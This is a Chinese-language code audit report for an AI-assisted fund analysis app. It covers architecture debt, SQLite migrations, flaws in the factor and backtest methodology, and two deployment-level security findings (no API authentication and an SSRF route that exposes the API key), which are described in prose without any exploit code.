# 全项目审查报告 — AI Fund Assistant

> 审查日期：2026-10-01 ｜ 基线 commit：`40f0a1b`（工作区无未提交改动）
> 范围：架构分层 / 功能模块 / 量化策略 / 数据源可靠性 / AI 模块 / 前端 / 测试与运维
> 方法：全量阅读代码 + 只读查询本机运行库 `data/fund_quant.db` + 跑通测试与构建；所有结论均带 `文件:行号` 证据

---

## 0. 结论速览

**需要优化，但性质不是"救火"，而是"收敛与工程化"。** 绝大多数模块的工程细节（防封禁、缓存口径、时区、幂等迁移、任务隔离）做得比同类项目扎实（见 §10「建议保留」）。本次共记录 **2 处 P0、27 处 P1、19 处 P2、5 处 P3**（含 §3.7 量化专项）。两处 P0 都在“部署面”而不是算法里。

**严重度定义**（全文统一）：`P0` = 凭据泄露 / 数据损坏 / 功能完全不可用；`P1` = 正确性、安全或可用性明显受损，应尽快修；`P2` = 可靠性、可维护性或体验受损；`P3` = 打磨项。

### 两处 P0

1. **整套 API 无鉴权，且后端端口直接发布到宿主机**，`GET /api/push-channels` 还会把飞书 webhook 与签名密钥原文回显（§4）。
2. **`ai_base_url` 写入不校验**（项目自带的 SSRF 校验器没用在这条路径上）→ 无鉴权调用方可把真实 API Key 转发到任意主机（§4）。

### 四类系统性问题

| 类别 | 代表问题 | 为什么重要 |
|---|---|---|
| **① 防线只在纸面上存在** | 五档阈值配置对实盘零生效；AI 的 12 万 token 预算永不触发；`/health` 恒返回 ok；工具"20s 超时"不存在；调休同步恒抛 `TypeError`；沪深300 估值分位因 250 行门槛恒为空 | 配置/文档承诺的护栏没生效，排查方向会被带偏；其中两项会让整个因子或功能长期静默失效 |
| **② 静默降级产生"看起来对"的错数据** | 场外净值取**未复权单位净值**（分红/拆分被当成真实下跌）；分页失败返回截断序列当成功；"数据不足"标记在每个出口都丢掉；估值源无负缓存且每次请求重试 | 直接污染因子与回测结论，且不留任何错误痕迹 |
| **③ 策略内部有重复计量与口径混用** | 动量族 4 个因子同源（41% 权重）；市场三因子全池同分且权重 1.8 > 买入阈值 1.5；回测头号指标衡量的是"半仓"；建议自进化学到的是市场 beta | 让"11 因子/超额收益/命中率"这些用户直接看的数字偏离其字面含义 |
| **④ 工程门禁缺失** | CI 只有 `uses:` 没有一行 `run:`；后端无 ruff/mypy 配置；前端无 ESLint；无 DB 备份 | 448 个测试全绿，但没有任何机制保证它们一直被跑 |


**体量基线**：后端 117 个 py 文件 / 23,354 行；测试 28 文件 / 7,194 行 / **448 用例 23s 全绿**；前端 16 页面 / 6,233 行（另有独立 Android 客户端 3,811 行 Kotlin）；101 个 API 端点。

**路线图一句话**：先做 §9 的**第 0 批**（收回端口暴露面 + 加令牌 + 密钥不回显 + `ai_base_url` 校验，半天）→ 第 1 批补"真防线"（AI token 预算、工具超时、外键、迁移 fail-fast、/health 真实化、CI 门禁）→ 第 2 批修"静默错数据"（复权口径、分页部分失败、`data_valid` 透传、估值分位、回测/建议口径）→ 第 3 批做收敛（巨石拆分、服务层归位、文档整合、升 Python 3.12）。

---

## 1. 体检基线（可复现）

```
pytest -q                     → 448 passed, 1 warning in 23.32s   ✅
后端                          117 文件 / 23,354 行 / 101 端点
测试                          28 文件 / 7,194 行（覆盖引擎、数据源、调度、AI、前端契约的纯 Python 侧）
前端                          src 21 文件 / 16 路由页面（懒加载 + manualChunks 已就位）
前端产物                      dist 2.0M；echarts chunk 1,054,667 B / mui 366,018 B / vendor 206,861 B
依赖                          akshare 1.18.63 / numpy 2.0.2 / Python 3.9.9（镜像 python:3.9-slim）
本机库 data/fund_quant.db     57 只活跃基金 / 11 个活跃因子（∑权重 8.3）/ 16,879 条持仓
```

**本机运行实例的真实状态**（只读查询，值得注意）：

| 项 | 值 | 含义 |
|---|---|---|
| `analysis_results` 日期范围 | 2026-05-23 → **2026-07-22**（123 行） | 核心分析链路已有 2 个多月没有产出新结果 |
| `schedules` / `push_channels` | **0 / 0** | 定时分析→推送闭环在本实例上从未配置 |
| `backtest_results` / `ai_conversations` / `advice_log` | 0 / 0 / 0 | 回测、AI、建议自进化模块未被实际使用过 |
| `error_logs` | 81 条，其中 **rate_limit 52 条**（other 10 / data 16 / ai 2 / network 1） | 失败构成以限流为主，符合防封禁设计的预期代价 |
| `fund_quarterly` / `fund_holdings` | 361 行（最新 2026-09-01）/ 16,879 行（最新 2026Q2） | 季度数据链路是通的，质量过滤的输入存在 |

→ **建议**：这个库看起来是"开发/调试实例"。上线前至少要跑一次真实端到端（配 1 个调度 + 1 个推送渠道 + 1 次全量分析），否则 `schedules` 为空这件事会让"调度器可靠性"这类改动无法被验证。

---

## 2. 架构评估

### 2.1 分层与依赖方向（结论：清晰，有 2 处非致命越界）

主干是标准的 `routers → services → engines / data_sources → models`，13 个路由模块挂在 `/api`，服务层按业务切分（33 个 service 文件），引擎层独立可测。用 AST 扫全量 import 图，只有 **2 个环**，且都是函数内延迟导入：

- `backend.models.ai_skill` ⇄ `backend.database`：ORM 基类循环（SQLAlchemy 声明式模型的常见形态，无害）。
- `akshare_adapter` ⇄ `services.error_log_service`：适配器埋点回调（延迟导入，无害）。

真正的越界是**数据源层反向依赖服务层**：

- `backend/data_sources/akshare_adapter.py:232` → `services.error_log_service`（埋点）
- `backend/data_sources/akshare_adapter.py:503` → `services.fund_detail_service.fetch_net_worth_trend`（pingzhongdata 解析）

后果不是崩溃，而是 `akshare_adapter.py` 长到 **974 行**、同时承担 HTTP、反爬、解析、降级、埋点五种职责，测试与替换成本高。建议把「pingzhongdata 解析」下沉到 `data_sources/parsers/`，把埋点抽象成注入的 `on_failure` 回调。

### 2.2 巨石文件（结论：18 个文件 > 400 行，前 3 个已到"改一处要读全文"的程度）

| 文件 | 行数 | 主要症结 |
|---|---|---|
| `backend/services/fund_realtime_service.py` | 1,302 | 5 种行情源解析 + 快照缓存 + 熔断 + 覆盖度估值模型 + 持仓补全混在一个类 |
| `backend/engines/quality_filter.py` | 1,096 | 参数表 / 形态识别 / 因子修正 / 阈值 / 决策 5 个关注点同文件 |
| `backend/data_sources/akshare_adapter.py` | 974 | 见 2.1 |
| `backend/database.py` | 786 | **启动期单体迁移**（见 2.3） |
| `backend/services/analysis_service.py` | 776 | 编排 + 截面标准化 + 落库 + 诊断字段 |
| 前端 `Dashboard.tsx` / `System.tsx` | 938 / 864 | 单文件多面板 + 轮询 + SSE 控制 |

建议以「行为不变的小步搬迁」拆，优先 `database.py` 与 `quality_filter.py`（纯函数多、搬迁风险最低）。

### 2.3 数据库与迁移（结论：这是最该动刀的一处架构债）

`backend/database.py:216-786` 把「建表 + 20+ 条 `ALTER TABLE` + 数据回填 + 种子插入 + 一次性重激活 + 阈值归一化」塞进一个 `init_db()`，靠 `try/except` + `_migration_ok()` 实现幂等：

```python
# backend/database.py:257-260
try:
    await conn.execute(text("ALTER TABLE analysis_results ADD COLUMN equity_ratio FLOAT NOT NULL DEFAULT 0.5"))
except Exception as e:
    _migration_ok(e, "analysis_results.equity_ratio")
```

问题不在现在能不能跑（能跑，且注释记录了每次修复的来龙去脉），而在于：

1. **没有版本概念**：`_migration_ok` 把「列已存在」和「迁移写错 SQL」都当正常跳过，后者只在日志里留一行 warning；一旦某次 `ALTER` 因 SQL 语法/顺序问题失败，列会永久缺失而不阻塞启动。
2. **启动路径含全表写**：`database.py:336-339` 的 `DELETE FROM analysis_results WHERE id NOT IN (...)` 只在索引缺失时跑一次（这点已优化过），但同段逻辑仍与建表混在一起。
3. **不可回滚、不可审计**：没有 schema 版本表，无法回答"这个库现在是什么版本"。

建议引入 Alembic（SQLite 完全支持 `batch_alter_table`），把现有 20+ 条迁移整理成按序 revision；短期最低成本方案是**加一个 `schema_migrations` 表 + 迁移失败时 fail-fast（而不是 warning）**，并补一条「迁移后校验列存在」的自检。

其余数据库层面结论良好：WAL + `busy_timeout=30s` 已配（`database.py:17-26`、`database.py:250-251`）；`uq_fund_date` 唯一索引防并发重复落库（`database.py:328-344`）；`_batch_load_quarterly_data` 显式批量化，避免 N+1（`analysis_service.py:127-161`）；`/trigger` 与分析服务有进程级 `_run_lock` 互斥（`analysis_service.py:99-104,175-180`），调度侧还带 900s 等锁（`task_scheduler.py:195-218`）——这几点做得比一般项目好。

### 2.4 幂等性与并发取消（一处真实缺陷）

`backend/services/fund_refresh_task.py:93-94` 在 `try` 之前调用 `state.reset_running()`，而 `except` 只捕 `Exception`（`:201`），**没有 `except asyncio.CancelledError`**。任务被取消（进程关停/超时取消）时 `running` 状态永不复位，配合路由守卫 `fund.py:231-233` `if state.status == "running": return already_running` → 刷新详情接口被永久锁死，直到重启进程。修法：用 `try/finally` 复位，并显式 `except asyncio.CancelledError: raise`。

### 2.5 服务层被路由层"掏空"：业务逻辑、原始 SQL、会话管理散落在 router

分层在文件层面成立（`services`/`engines` 从不 import `routers`，AST 全量核对成立），但在**职责层面**有明显回流：

- **router 里写原始 SQL / 关联子查询**：`routers/fund.py:516-553` 直接构造 `aliased(FundHolding)` + 相关子查询（我在 §"持仓重叠度"读到的就是这段，`ai_tools/data_tools.py:308-325` 又复制了一份同样的子查询）。
- **router 绕过依赖注入自己开会话**：`routers/fund.py:482-485,495-497,505-507,574-578,603-605` 多处 `async with async_session_factory() as session`。
- **业务规则写在 router**：`routers/position.py:110-119`（`replace` 模式先 `delete(UserPosition)` 再逐条 upsert）、`routers/analysis.py:459-471`（30 天评估窗口 + 逐条网络取数）。
- **同一段逻辑写三份**：市场概况的"5 源并发取数 + cache_data 组装"分别出现在 `routers/analysis.py:232-268`、`:297-326`、`services/push_service.py:163-235`；`AnalysisResultOut` 的 ORM→Schema 映射同时存在于 `routers/analysis.py:77-120` 与 `services/analysis_service.py:621-647`，且两处对 `quality_warnings`/`original_score` 的处理已经不一致（这正是 §3.7 那个 `data_valid` 丢失问题的同源症状）。
- **N+1**：`GET /api/funds/change-summary` 对每只活跃基金串行跑"近年线两两 diff + 经理"约 6 次查询（`routers/fund.py:266-271` → `fund_change_detector.py:43-44` → `fund_holding_service.py:137-169` + `fund_manager_service.py:179-183`）。57 只基金一次请求 ≈ 340 次往返。修法：按 `fund_id.in_(ids)` 批量取两个季度与全部经理记录，在 Python 里 diff。

**建议**（不急于大动，做新功能时顺手归位即可）：把市场概况组装收敛成 `MarketService.fetch_summary_snapshot()` 供 router/push 共用；把重叠度/组合透视/概念映射查询移入 service；`AnalysisResultOut` 映射只保留一处。

---

## 3. 功能模块与策略层

### 3.1 功能版图（13 个路由模块 / 101 端点 / 16 个前端页面）

| 模块 | 端点前缀 | 状态评估 |
|---|---|---|
| 基金池 + 详情/持仓/经理/主题/ETF 扫描/概念映射/重叠度 | `/api/funds` | 功能最全，但单文件 625 行且含原始 SQL（见 §8 分层） |
| 分析（查询/触发/SSE/导出导入/复盘/PK/市场环境） | `/api/analysis` | 主干闭环完整；五档阈值配置无效（见 3.3） |
| 因子 CRUD / 导入导出 | `/api/factors` | 完整；导入按条 commit 非原子 |
| 调度 / 报告配置 / 推送渠道 / 系统配置 / 调休 | `/api/schedules` 等 | 完整；**本机实例 schedules=0/push_channels=0，闭环未被真实运行过** |
| AI 对话 / Agent / Skills | `/api/ai/*` | 能力完整，护栏有 2 个失效 + 1 个缺失（见 §6） |
| 回测（单基金 / 全量批量 / 费率配置） | `/api/backtest` | 方法学基本正确（next-bar + 复利 + 费率），但见 3.4 |
| 我的持仓 | `/api/positions` | CRUD + CSV 导入完整，无赎回持有期费用约束 |

**结论**：功能覆盖面已经超过"个人自用"的常规需求，问题不在缺功能，而在**若干功能的承诺与实际行为不一致**（3.3 是典型）。

### 3.2 因子体系（11 因子 / ∑权重 8.3）的方法学评估

当前活跃因子集（只读查库确认）：

| 因子 | 权重 | 标准化 | 方向性判断 |
|---|---|---|---|
| short_momentum / mid_momentum | 1.2 / 1.2 | 截面 z-score | 动量，与其余动量因子同源 |
| momentum_accel / trend_consistency | 0.5 / 0.5 | 截面 z-score | 同为 20/60 日动量派生 |
| inv_volatility | 1.0 | 截面 z-score | 低波动异象 |
| return_risk_ratio | 0.8 | 截面 z-score | 类夏普 |
| drawdown_recovery | 0.8 | 规则 | 回撤修复 |
| macd_signal | 0.5 | 规则 | 唯一稳定可负的双向绝对因子 |
| market_valuation / market_sentiment / market_fund_flow | 0.8 / 0.5 / 0.5 | 规则 | 全池同分的市场择时叠加 |

**优点**：规则型与截面型混用是有意设计——纯截面 z-score 因子在同涨同跌的普涨市里会互相抵消趋近 0，靠 `macd_signal` 这样的绝对因子才能把走弱基金打到卖出阈值以下（`quality_filter.py:66-72` 的长注释完整记录了这个根因）。

**需要正视的三点**：

1. **动量族合计权重 3.4 / 8.3 ≈ 41%**，且 4 个因子全部由 20/60 日动量派生（`README.md:222` 已自述）。这意味着策略实质是"追近期强势"，在动量反转期（A 股常见）会集中受伤；而卖出门槛依赖单一 `macd_signal`（权重 0.5）承担"把弱势基金打负"的全部职责，鲁棒性偏薄。
2. **截面 z-score 让评分依赖"池子里恰好有谁"**：同一只基金在池子构成变化后分数会变，而分数又被落库、被回测复用、被 AI 引用。这不是 bug（回测重放的就是当时的口径），但意味着**评分不能当作基金的绝对质量指标跨期比较**；前端与 AI 文案里应显式标注"池内相对分"。
3. **市场三因子对全池同分偏移 ±1.8**：极端估值期会把整池分数整体推高/推低，可能出现"全池一起买/一起卖"的羊群信号。若希望市场择时与个基选择解耦，更稳的做法是让市场因子只调节**阈值**（现在已经是这么做的：`compute_dynamic_thresholds` 按估值分位上下调 buy 阈值）而不进入加权和，否则同一件事被计入了两次。

### 3.3 【P1】评分"五档阈值"配置对实盘决策完全无效，但界面允许编辑且 AI 会引用它

这是本次审查中**最容易被用户误判为"系统坏了"**的一处。

- 生产唯一调用路径：`analysis_service.py:542` `compute_with_quality_filter(...)`。
- 该函数只用 `base_signal.weighted_score` / `raw_score`（`scoring_engine.py:227-233`），而 `weighted_score` 只是**加权和钳位**（`scoring_engine.py:148` `max(-8.5, min(8.5, weighted_sum))`），与阈值无关；`compute()` 内部依阈值算出的 `direction/strength/advice/equity` **全部被丢弃**（`scoring_engine.py:241-254`）。
- 最终方向由动态阈值决定（`quality_filter.determine_signal`，基础值 `base_buy_threshold=1.5` / `base_sell_threshold=-1.5`，见 `quality_filter.py:63-72`），权益仓位来自**硬编码映射**（`scoring_engine.py:249-253`）。
- 于是：`GET/PUT /api/system/scoring-config`（`routers/system_config.py:127-208`）+ 前端 `/scoring-config` 页面可编辑的 5 档 `min_score/label/operation_advice/equity_ratio`，**没有任何一处被生产消费**（全仓 `scoring_thresholds` 消费者只有：该路由自身、`database.py` 迁移/种子、`ai_service.py:196` 拼提示词）。
- 更糟的是 `ai_service.py:196-204` 把这份失效配置作为【评分阈值配置】写进系统提示词 → **AI 会用错误的档位解释真实信号**（例如把动态阈值产生的 buy 说成"评分 2.0 属适度加仓"）。
- 代码里其实知道这件事（`scoring_engine.py:26-31`、`README.md:223` 都已注明"五档仅旧路径生效"），但前端页面没有任何提示，`analysis_service.py:477` 的注释甚至写着"真正生效的是五档 scoring_thresholds"——与实现相反。

**建议**（择一，二选一都要动前端）：
- (A) 删掉五档配置：移除 `/api/system/scoring-config`、前端页面、`scoring_thresholds` 种子与 AI 提示词段，把"质量过滤配置"页的 `base_buy_threshold/base_sell_threshold` 作为唯一阈值入口；
- (B) 让它真生效：`compute_with_quality_filter` 改为用五档的 `label/advice/equity_ratio` 渲染最终建议（方向/强度仍由动态阈值定），并把 `equity_map` 改为读配置。
无论选哪个，都要修掉 `ai_service.py` 的提示词来源。

### 3.4 回测与归因（方法学基本正确，但有 3 个口径问题）

**做对的部分**：`backtest_service.py:274-343` 已实现 **next-bar execution**（T 日信号作用于 T+1 收益，注释与实现一致）、几何复利（`:339`）、按 `|Δ仓位| × 费率` 扣成本（`:336`，费率可配、有区间钳制 `:42-67`）；`_nav_cache` 有 200 条上限（`:90-94`）。这些正是历史上那次审计（`CODE_AUDIT_2026-08-22.md`）提出的问题，确已修复。

仍存在的口径问题：

1. **无信号日仓位被重置为 50%**：`:326-330` 未命中信号时 `current_position = default_position(0.5)`，且该值成为次日仓位。分析不是每个交易日都跑（失败、非交易日、手动触发都不落信号），于是"漏一次分析"= 仓位被打回 50% 并产生一次换仓成本。正确语义应是**沿用最近一次信号仓位**。影响：回测换手与收益被系统性扭曲，且越是数据源不稳的时期（恰恰是用户最需要看回测的时候）扭曲越大。
2. **样本由"何时把基金加进池子"决定**：信号来自 `analysis_results` 表（`:1,127-170`），因此回测起点=该基金首次被分析之日。用户是先看好才入池，回测区间天然带选择偏差，会高估策略。建议在回测结果里显式标注覆盖区间与信号数量，并对信号数 < N 的情况拒绝出结论。
3. **基金池非 point-in-time**：截面因子的基准是"当期池子"（见 3.2），回测重放的是历史池子构成，这一致于实时行为，但使"跨基金的策略对比"不可比；配合 2 会进一步放大乐观偏差。

### 3.5 建议链路缺少"可执行性"的另一半

项目已经做了**买入侧**可执行性约束（暂停申购/封闭期 → 降级观望，`quality_filter.py:783-811`，开关 `otc_pause_veto_buy`），这是很好的细节。但**卖出/换仓侧的成本与持有期约束缺失**：

- 场外基金持有 < 7 天赎回费通常 1.5%，7 天~1 年 0.5% 左右。系统按日产出信号、`rebalance.py` 给出四清单（买/卖/观察/加仓），却没有"距上次买入天数"这一约束，也没有把赎回费计入换仓代价（`rebalance.py` 仅在权重计算里用 `cost_nav`）。
- 结果：一条"减仓"建议可能对应 1.5% 的确定损失，而策略日均收益量级远小于此。建议在 `rebalance.py`/`advice` 层引入 `min_holding_days` 与阶梯赎回费，或在建议文案里标注"持有不足 7 天，赎回费 1.5%，建议先观察"。

### 3.6 与 §5 的联动：未复权净值会污染本节的结论

§5 的"场外净值用未复权单位净值"不是数据源小瑕疵，它直接打击本节的因子与回测：`drawdown_recovery` = `nav / rolling_max(nav, 252)`（`factor_engine.py:548-552`）在**分红除权日**会被记成一次真实回撤，而 `inv_volatility`/`return_risk_ratio` 会把除权日的跳空计入波动率。修这一条（用已存在的 `日增长率` 或 `LJJZ` 重建复权序列）的性价比高于任何因子权重调参。

### 3.7 量化专项复核（每条都已回到源码/运行证据核对）

#### [P1] "数据不足"标记 (`data_valid`) 被算出来，但在每一个消费出口都丢掉

- 证据：`factor_engine.py` 20 处 `data_valid=False`（如 `:354` 波动率倒数、`:519/:537` 动量）；权重计算不做任何覆盖率归一——`scoring_engine.py:143` `weighted_sum += score.score * weight`（0 分仍占满权重）。而落库只存 5 个字段：`analysis_service.py:566-574`（`name/raw_value/score/direction`），Schema 里也没有这个字段：`schemas/analysis.py:10-15`。
  - **每日推送**路径重建对象时丢掉：`push_service.py:296-306` `FSR(factor_code=..., ...)` 未传 `data_valid` → 默认 `True`。
  - **API/前端**路径同样没有：`routers/analysis.py:85,93`、`analysis_service.py:633` 走 `FactorScore`（无字段）。
  - 唯一消费者 `report_engine.py:262` 的"以下因子数据不足，评分可能不准确"警告因此**只在源码里存在**，报告、接口、AI 上下文都不会出现。
  - 另外 `quality_filter.py:648-655` 重建 `inv_volatility` 结果时把标记重置为 `True`。
- 影响：一只只有 3 个月净值的基金，动量/波动率/夏普全取中性 0 并保持满权重，得到一个**看起来很确定的评分和建议**；推送/接口/AI 都无法区分"中性信号"与"没有数据"。两只数据覆盖完全不同的基金被当成可比较对象排序。
- 建议：`factor_scores` JSON 落 `data_valid`（并落覆盖率）；按有效因子权重归一 `raw_score`；覆盖率低于阈值时拒绝评分或显式标注"数据不足"。

#### [P1] 市场三因子（权重 1.8）对全池同分，且 1.8 > 买入阈值 1.5 → 买卖分布由市场而不是选基决定

- 证据：`factor_engine.py:692` 起的市场因子只读 regime 快照、不读 `fund_data`（所有基金同分）；`analysis_service.py:495-499` 把同一个快照注入每一只基金；权重 0.8+0.5+0.5 = 1.8（只读查库确认），而 `quality_filter.py:62` `base_buy_threshold = 1.5`。
- 影响：截面因子（6 个，合计权重 5.0）按构造是零均值——**池内中位数的基金在截面部分得 0**。此时如果当天市场因子给满（+1.8）加上"处在新高"的 `drawdown_recovery`（+0.8）与机构偏置（最多 +0.5），中位数基金可超过 +1.5 → 整池"适度加仓"；风险偏好日翻过来整池"减仓"。**选基与择时不可分离**，每日买卖数量实际上是指数温度计。
- 说明：市场因子带动全池分数可能是刻意设计（代码注释明确希望市场环境参与决策），而且阈值侧已经有同类调节（`compute_dynamic_thresholds` 按估值分位上下调 buy 阈值）。问题在于**同一件事被计了两次**：一次进加权和，一次改阈值。
- 建议：二选一——把市场项从"与个基阈值比较的分数"里剥离（改为 `阈值 = base + 市场分量`，只保留现有的阈值侧调节），或对最终分数做截面标准化后再套个基阈值。

#### [P1] 动量族实为同一个信号计了四遍（3.4/8.3 = 41%）

- 证据（代数关系，已逐行核对）：`short_momentum = P[-1]/P[-21]-1`（`factor_engine.py:522`）、`mid_momentum = P[-1]/P[-61]-1`（`:540`），而 `momentum_accel = mom20 - mom60`（`:615`）**恒等于 `short_momentum - mid_momentum`**；`trend_consistency = (sign(mom20)+sign(mom60))/2`（`:641-643`）是同样两个输入的确定性函数。权重合计 1.2+1.2+0.5+0.5 = 3.4。此外 `return_risk_ratio`（`:593`）与 `inv_volatility`（`:360`）共用同一个 60 日标准差分母，再叠加 1.8 权重。
- 影响：实际动量/低波动暴露远大于权重表所示，加权分的独立信息量远低于"11 因子"给人的印象，±1.5 阈值容易被同一个共同因子推着穿越；因子诊断还会把 4 个高度相关的 RankIC 当作 4 份独立证据。
- 建议：保留 short/mid 两个动量，`momentum_accel` 与 `trend_consistency` 要么去掉，要么对 short/mid 做正交化；并给相关因子簇设权重上限。

#### [P1] 沪深300 估值分位**恒为空** → 0.8 权重因子永久中性，极端估值阈值调节永不触发

- 运行证据（本机 `data/logs`，2026-09-29 至 2026-10-01 多次出现）：
  ```
  backend.services.market_regime_service:187 估值历史数据不足: 100 行，跳过分位计算
  ```
  源码对应 `market_regime_service.py:184-188` `if len(valid) < 250: logger.info(...); return`。`_get_index_pe_series`（`:150-176`）取的是 `ak.stock_zh_index_value_csindex`（中证官网滚动 `*.xls`），实测该文件只覆盖约 100 个交易日，**永远过不了 250 行门槛**。
- 影响链：`valuation_percentile` 恒为 `None` → ① 0.8 权重的 `market_valuation` 因子长期 `data_valid=False`（配合上一条即"永久中性且占满权重"）；② `quality_filter.compute_dynamic_thresholds` 的"极端高估上调 / 极端低估下调"永不生效（`:725-736`）。
- 补充：专项审计在同一文件里还发现 `akshare_adapter.py:707,741` 用 `df.iloc[-1]  # 取最新一条`，而该 xls 按日期**倒序**排列（若成立则取到的是最旧一行）；并且 `市盈率2` 被写进 `fund_data.pb`。我已核实 **`市盈率2` 确实是市盈率口径而不是市净率**（akshare 的列重命名把原始 `市盈率1（总股本）/市盈率2（计算用股本）` 映射为 `市盈率1/市盈率2`，见 `stock_zh_index_value_csindex` 源码），所以这里的 PE→PB 混用是确定的；但我**未能在本机复现"倒序"与行数**（本机缺 CA，`CERTIFICATE_VERIFY_FAILED`，与项目文档记录的本地环境问题一致），行数以日志为准（100 行）。好在 `FundData.pb` 目前**无任何消费方**（仅被赋值，未出现在任何 schema/因子中），因此 PE→PB 混用是潜在缺陷（P3），不影响评分。
- 建议：把 `< 250` 门槛与数据源能力对齐（或改用有足够历史的源，如 `stock_index_pe_lg` 的月频序列——注意它自带"近一年分位"标签与实际口径不符的问题，见下）；取行前按日期排序并断言列语义；`pb` 要么补正确列要么删字段。

#### [P1] 回测的头号指标 `excess_return` 主要衡量的是"半仓"，不是信号能力

- 证据：`backtest_service.py:176` `excess_return = total_strategy_return - total_nav_return`；而策略仓位由 `POSITION_MAP` 与 `default_position=0.5` 决定（`:19-25,289`），无信号日回到 0.5（`:326-330`），现金部分收益为 0（`:334` `strategy_daily = daily_return * position`，未计无风险利率）。本机库里信号只分布在 **6 个日期**（2026-05-23…2026-07-22，`analysis_results` 123 行）。
- 影响：约 250 个交易日里策略大部分时间半仓，于是"策略总收益 vs 基金净值收益"的差额主要是仓位差与现金拖累。用户看到"超额收益 -20%"会以为是信号失效，实际主要是没满仓。同时只有 6 天信号却给出完整回测结论，没有任何样本量下限提示。
- 建议：给出"仅在信号日持仓"的口径、补上"静态 50% 仓位"与"买入持有"两条基线、`signal_count/total_days` 低于阈值时返回 caveat 或 None；现金部分计短端利率（或明确标注不计息）。

#### [P1] "建议自进化"学到的是市场 beta，不是信号质量

- 证据：`advice_learning_service.py:123-126`
  ```python
  if action in SELL_ACTIONS:  hit = 1 if fund_change < 0 else 0
  elif action in BUY_ACTIONS: hit = 1 if fund_change > 0 else 0
  ```
  即**用绝对涨跌判命中**；`bench_change` 形参存在但调用方直接传字面量 0：`routers/analysis.py:471` `store.record_outcome(item["advice_id"], item["action"], fund_chg, 0.0)`。评估窗口也不是 30 天：`:463-468` 取"建议日 → 最新净值"（最长 90 天截断），随后 `calibrate()` 据此改写 `stop_loss_pct`/`profit_take_pct`。
- 影响：上涨市里所有 buy 建议"命中"、所有 sell 建议"未命中"，与信号质量无关；自校准会把止损线不断推向激进一侧。该统计还会被 AI Skill 读取并当成"已验证结论"呈现（`ai_tools/skill_tools.py:46-48`）。
- 建议：改用 `excess = fund_change - bench_change > 0` 判命中（bench 已在手），固定到"建议日 + 30 个交易日"且仅在窗口走完后评估，校准前要求样本同口径。

#### [P2] 亏损基金的年化收益显示为"—"（PK 表被动幸存者偏差）

- 证据：`fund_compare_service.py:39-40` `if years <= 0 or total <= 0: return None`——几何年化对 `total > -100%` 都有定义，`total <= 0` 分支没有数学理由。`tests/test_fund_compare.py` 只覆盖了正收益用例。
- 影响：`/api/analysis/compare` 的"年化收益"列恰好对**亏钱的基金**留空，而夏普/回撤/Beta 照常显示 → 对比表看起来比实际更乐观，用户无法在同表里给落后者排序。
- 建议：删掉 `total <= 0`（只保留 `1 + total <= 0`），补一个负收益用例。**改动 1 行，性价比极高。**

#### [P2] 无净值新鲜度门槛：停牌/清盘中的基金用陈旧净值拿到今天的信号

- 证据：`analysis_service.py:45-55` `_no_nav_reason` 只判"空序列"（`if not fd.close_history and fd.close is None`）；全仓没有任何地方把 `fund_data.date`（`akshare_adapter.py:339,562`）与 `beijing_today()` 比较；各因子只检查 `len(close_history)`。
- 影响：上游静默返回旧缓存或基金已暂停披露时，陈旧净值会被当作今日数据评分并写入 `analysis_results`（`analysis_date=今天`），回测再把这段陈旧尾巴当成真实交易日重放。
- 建议：最新净值日期超过 N 个交易日（按交易日历）即否决或硬标记；结果里带上净值 as-of 日期。

#### [P2] "棺材钉"前置否决在恢复窗口不完整时也生效

- 证据：`quality_filter.py:214,227-235`：`for start in range(n - consec)`，`end_idx = min(recovery_start + recovery_days, n)`，随后 `if max_future < peak_price * recovery_pct(0.90): vetoed`。当 `start` 靠近序列末尾时，文档要求的 60 日恢复窗口只被观测到 0~几天。
- 影响：近 20 个交易日刚暴跌、尚未走完恢复期的基金，会被按"60 日未恢复"否决——恰好把最近跌下来的（可能最便宜的）候选整体剔除，且日志里看起来理由充分。
- 建议：`if recovery_start + recovery_days > n: continue`（样本不足则该形态暂不判定），或标注为"临时否决"待下一轮复核。

#### [P2] 调仓权重用成本价且带 `1.0` 哨兵值

- 证据：`ai/rebalance.py:200` `weights[fid] = p.shares * p.cost_nav if p.cost_nav else 1.0`，归一化后成为四清单里所有 `weight_pct` 与组合约束（主题集中度 ≥30%、QDII 权重）的输入（`:243,375-384`）。仅当**全部**持仓都缺成本价时才加"按等权近似"的说明（`:203-204`）。
- 影响：混合场景（部分持仓有成本价、部分没有）下，缺失者被赋 1.0 与 `shares×cost` 量级混算，权重严重失真；用成本价而非最新市值还忽略了浮盈浮亏，集中度/QDII 告警与展示权重都可能错。
- 建议：`shares × 最新净值`；确实缺失时显式等权并写明 caveat，不要用哨兵值。

#### [P2] 因子诊断的 RankIC/IR 统计：重叠前瞻收益 + 未年化 + 多重比较未校正

- 证据：`ai/factor_audit.py:41-52` 前瞻收益按 horizon 计算（默认 `(5,20)`，`:288`），`:137` `rank_ic_ir = mean/std`。T+20 的前瞻收益在相邻交易日重叠 19 天，IC 序列强自相关，而代码按每个自然日计数；`:240` 的 markdown 表按 `rank_ic_mean` 排序且不做任何校正；`MIN_CROSS_SECTION = 5`（`:30`）样本极小。
- 影响：`horizon=20` 的 IR 相当于被放大约 √20；`days=90` 实际只有约 4.5 个独立周期，11 个因子里挑"最优"基本是在挑噪声。而该诊断窗口与用户调权重/阈值的窗口是同一段数据，没有样本外验证。
- 建议：改用不重叠窗口或 Newey–West/block bootstrap，IR 明确年化并标注口径，做多重比较校正，并留出样本外区间。

#### [P2] 复盘基准是价格指数，且场外/场内收益口径不一致 → 系统性夸大"跑赢沪深300"

- 证据：`services/review_service.py:174-185` 基准取 `get_benchmark_series()`（沪深300 **点位**，价格收益），文案直接写 `跑赢/跑输沪深300`（`:202`）。同一指数的股息率约 2.7%（`股息率1` 列）。同时组合内部口径不统一：ETF 走 `adjust="qfq"`（`:274`），场外走 `单位净值`（`:291`，不含分红，见 §5）。
- 影响：只跟踪指数的组合会被记上 ~2.7pp/年的"超额收益"；同一张表里 ETF 与场外行用的是不同收益定义，等权组合收益与信号命中统计都在混口径。
- 建议：用全收益基准（或把股息率加回指数），场外改用累计/复权净值，并在报告头部写明口径。

#### [P3] 其余"可配置但无效"与口径不一致

- **截面因子的 `signal_rules` 是死配置**：种子数据给 `short_momentum` 等因子写了 `signal_rules`（`database.py:67-71`），但这些因子 `normalization=cross_sectional_zscore`，`calculate_short_momentum` 直接返回原始动量、从不调用 `rules_from_params`（`factor_engine.py:522-525`），实际分档由 `zscore_thresholds` 决定。前端/接口若允许编辑 `signal_rules`，用户改了不会有任何效果（与 §3.3 五档阈值同类问题，严重度更低）。
